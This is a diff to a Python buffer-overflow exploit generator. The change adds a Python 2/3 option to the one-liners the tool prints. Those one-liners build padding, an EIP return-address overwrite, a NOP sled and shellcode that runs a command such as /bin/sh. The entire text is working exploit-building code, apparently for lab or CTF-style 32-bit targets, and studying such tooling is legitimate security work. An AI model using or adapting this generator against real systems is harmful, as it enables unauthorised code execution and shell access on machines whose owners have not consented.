@@ -86,7 +86,7 @@ def find_offset(value):
     except Exception as e:
         print(f"Erro: {e}", file=sys.stderr)
 
-def generate_dummy_payload(offset_size):
+def generate_dummy_payload(offset_size, version):
     """Generates dummy payload: A * offset + B * 4 + NOPs."""
     print(f"[*] Mounting dummy payload (Offset: {offset_size}, EIP: BBBB, NOPs: 500)...", file=sys.stderr)
     
@@ -94,7 +94,13 @@ def generate_dummy_payload(offset_size):
     print("-" * 80, file=sys.stderr)
 
     # Allows to verify potential register to override EIP with
-    python_command = f"python -c 'print \"A\"*{offset_size} + \"B\"*4 + \"\\x90\"*500'"
+    if version == "python2":
+        python_command = f"python -c 'print \"A\"*{offset_size} + \"B\"*4 + \"\\x90\"*500'"
+    else:
+        python_command = (
+            f"python3 -c 'import sys; sys.stdout.reconfigure(encoding=\"latin-1\"); "
+            f"print(\"A\"*{offset_size} + \"B\"*4 + \"\\x90\"*500, end=\"\")'"
+        )
     
     print(python_command)
     print("-" * 80 + "\n", file=sys.stderr)
@@ -130,7 +136,7 @@ def generate_shellcode(cmd_string):
 # =========================================================
 # PAYLOAD GENERATION
 # =========================================================
-def generate_payload(padding_size, ret_addr_hex, cmd_string):
+def generate_payload(padding_size, ret_addr_hex, cmd_string, version):
     """Mounts the buffer overflow structure."""
     # 1. HANDLE RET ADDR (LITTLE ENDIAN)
     try:
@@ -152,7 +158,13 @@ def generate_payload(padding_size, ret_addr_hex, cmd_string):
     print("-" * 80, file=sys.stderr)
 
     # STRUCTURE: [PADDING] + [EIP RET ADDR] + [NOPs] + [SHELLCODE]
-    python_command = f"python -c 'print \"A\"*{padding_size} + \"{return_addr_escaped}\" + \"\\x90\"*500 + \"{shellcode_escaped}\"'"
+    if version == "python2":
+        python_command = f"python -c 'print \"A\"*{padding_size} + \"{return_addr_escaped}\" + \"\\x90\"*500 + \"{shellcode_escaped}\"'"
+    else:
+        python_command = (
+            f"python3 -c 'import sys; sys.stdout.reconfigure(encoding=\"latin-1\"); "
+            f"print(\"A\"*{padding_size} + \"{return_addr_escaped}\" + \"\\x90\"*500 + \"{shellcode_escaped}\", end=\"\")'"
+        )
     
     print(python_command)
     
@@ -176,6 +188,7 @@ def main():
     parser.add_argument("--padding", type=int, default=268, help="Number of 'A's to reach EIP  (Default: 268). See --offset & --cyclic")
     parser.add_argument("--ret", type=str, default="0xbffffb04", help="The address to override EIP with (Default: 0xbffffb04)")
     parser.add_argument("--cmd", type=str, default="/bin/sh", help="CMD to be executed  (Default: /bin/sh)")
+    parser.add_argument("--version", choices=["python2", "python3"], default="python3", help="Python version for the command (Default: python3)")
 
     args = parser.parse_args()
 
@@ -189,9 +202,9 @@ def main():
     elif args.offset:
         find_offset(args.offset)
     elif args.dummy:
-        generate_dummy_payload(args.dummy)
+        generate_dummy_payload(args.dummy, args.version)
     else:
-        generate_payload(args.padding, args.ret, args.cmd)
+        generate_payload(args.padding, args.ret, args.cmd, args.version)
 
 if __name__ == "__main__":
     main()
